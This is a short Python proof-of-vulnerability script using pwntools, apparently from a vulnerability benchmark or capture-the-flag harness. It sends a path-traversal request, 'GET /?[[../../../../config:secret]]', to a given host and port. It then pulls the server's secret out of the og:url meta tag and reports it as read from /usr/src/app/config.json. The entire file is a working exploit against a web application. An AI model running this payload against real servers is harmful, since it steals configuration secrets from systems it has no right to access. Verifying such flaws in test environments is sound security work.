import sys
import os
import signal
import time
from pwn import *

def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    conn = remote(HOST,PORT)
    data = 'GET /?[[../../../../config:secret]]\r\n\r\n'
    conn.send(data)
    resp = conn.recv().decode('utf-8')
    conn.close()
    
    resplines=resp.splitlines()
    secret=''
    for line in resplines:
        if line.find('meta property="og:url"') != -1:
            contentstart=line.find('content="')+9
            contentend=line.find('" />')
            content=line[contentstart:contentend]
            secret=content[content.find('?')+1:]
            break  
    if secret == '' or secret == 'secret':
        print('[FAILED] POV Failed', flush=True)
        exit(0)
    print("Retrieved server secret from /usr/src/app/config.json", flush=True)
    print('SECRET='+ secret, flush=True)
    print('[SUCCESS] POV Succeeded', flush=True)
    exit(0)

if __name__ == '__main__':
    main()


